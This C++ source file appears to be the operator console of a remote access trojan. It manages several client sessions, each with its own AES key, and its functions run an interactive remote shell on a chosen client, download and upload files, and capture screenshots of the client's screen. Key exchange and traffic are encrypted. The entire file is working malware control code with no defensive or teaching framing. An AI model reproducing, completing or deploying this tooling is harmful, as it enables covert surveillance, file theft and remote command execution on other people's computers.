#include <cstdio>

#include "DATA.h"
#include "helper.h"


void DownloadFile(MSG_INFO msgInfo)
{
	FILE* pFile = NULL;
	fopen_s(&pFile, g_arg2, "wb+");
	for (int i = 0; i < msgInfo.count; i++)
	{
		DATA_INFO data = {};
		recv(g_client, (char*)&data, sizeof(DATA_INFO), NULL);
		AESDecrpty((PCUCHAR)&data, sizeof(DATA_INFO), (PUCHAR)&data);
		fwrite(data.buff, 1, data.size, pFile);
	}
	fclose(pFile);

	return;
}

void UploadFile(MSG_INFO msgInfo) {
	FILE* pFile = NULL;
	fopen_s(&pFile, g_arg1, "rb");
	if (!pFile) {
		printf("%s file doesn't exist\n", g_arg1);
		cmdCleaner();
		return;
	}
	fseek(pFile, 0, SEEK_END);
	int fileSize = ftell(pFile);

	rewind(pFile);
	int nCount = GET_COUNT(fileSize, DATA_SIZE);
	
	for (int i = 0; i < nCount; i++)
	{
		char buf[DATA_SIZE] = {};
		int size = DATA_SIZE;

		if (i == nCount - 1 && fileSize % DATA_SIZE) {
			size = fileSize % DATA_SIZE;
		}

		fread(buf, size, 1, pFile);
		SendMsgData(g_client, buf, size);
	}
	fclose(pFile);
	DATA_INFO tempSuccessMsg = {};

	recv(g_client, (char*)&tempSuccessMsg, sizeof(DATA_INFO), NULL);
	AESDecrpty((PCUCHAR)&tempSuccessMsg, sizeof(DATA_INFO), (PUCHAR)&tempSuccessMsg);
	printf("%s\n", tempSuccessMsg.buff);
	
}



void SystemCmd(SOCKET client, char* pArg1, char* pArg2) {
	SendMsgInfo(client, SYS, 0);   // pair 3 msgInfo cmd sys

	while (true) {
		cmdCleaner();
		printf("Shell>>");
		char cmd[100] = {};
		gets_s(cmd, sizeof(cmd));

		// send cmd
		SendMsgData(client, cmd, strlen(cmd));  // pair 4 cmd sys data
		if (!strcmp(CMD_QUIT, cmd)) {
			printf("break........probably because cmd value is quit\n");
			break;
		}
	}

}

void SystemCmd(SOCKET client) {
	while (true) {
		DATA_INFO dataInfo = {};
		int ret = recv(client, (char*)&dataInfo, sizeof(DATA_INFO), NULL);
		AESDecrpty((PCUCHAR)&dataInfo, sizeof(DATA_INFO), (PUCHAR)&dataInfo);

		if (ret == -1) {
			break;
		}
		if (!strcmp(dataInfo.buff, CMD_QUIT)) {
			break;
		}
		printf("%s", dataInfo.buff);
	}
	

}


void RecvScreenPic(MSG_INFO msgInfo) {
	printf("\nsize = %d\n", msgInfo.size);

	FILE* pFile = NULL;
	fopen_s(&pFile, "screenshot.bmp", "wb+");
	printf("Please grab a tea when I am downloading.\n");
	for (int i = 0; i < msgInfo.count; i++)
	{
		DATA_INFO data = {};
		recv(g_client, (char*)&data, sizeof(DATA_INFO), NULL);
		AESDecrpty((PCUCHAR)&data, sizeof(DATA_INFO), (PUCHAR)&data);
		fwrite(data.buff, 1, data.size, pFile);
	}
	fclose(pFile);
	printf("got the screenshot picture.\n");
	
	return;

}



void ChangeSession(char* pArg1) {
	int n = atoi(pArg1);
	if (n >= g_ClientCount || n < 0) {
		printf("failed to change session.\n");
		cmdCleaner();
		return;
	}
	g_curClientIndex = n;
	g_client = g_ClientSocks[g_curClientIndex].client;
	printf("\nchanged session into %d successfully.\n", g_curClientIndex);
	printf("Now g_client = %d.\n", g_client);
	SetAESKeyAndIv(g_ClientSocks[g_curClientIndex].aesKey, g_ClientSocks[g_curClientIndex].aesIv);
	printf("%d, %d\n", g_ClientSocks[g_curClientIndex].aesKey, g_ClientSocks[g_curClientIndex].aesIv);
	printf("set the matched Key and Iv for new client session.");

}

void KeyCmd(SOCKET client) {
	DATA_INFO dataInfo = {};
	int ret = recv(client, (char*)&dataInfo, sizeof(DATA_INFO), NULL);

	// decrypt the data
	AESDecrpty((PUCHAR)&dataInfo, sizeof(DATA_INFO), (PUCHAR)&dataInfo);

	int outSize = 0;
	PUCHAR pBuf = RSADecrypt((PUCHAR)dataInfo.buff, dataInfo.size, &outSize);
	memcpy(g_ClientSocks[g_newClientIndex].aesKey, pBuf, AES_KEY_IV_SIZE);
	memcpy(g_ClientSocks[g_newClientIndex].aesIv, pBuf + 16, AES_KEY_IV_SIZE);
	SetAESKeyAndIv(g_ClientSocks[g_newClientIndex].aesKey, g_ClientSocks[g_newClientIndex].aesIv);
	
	
}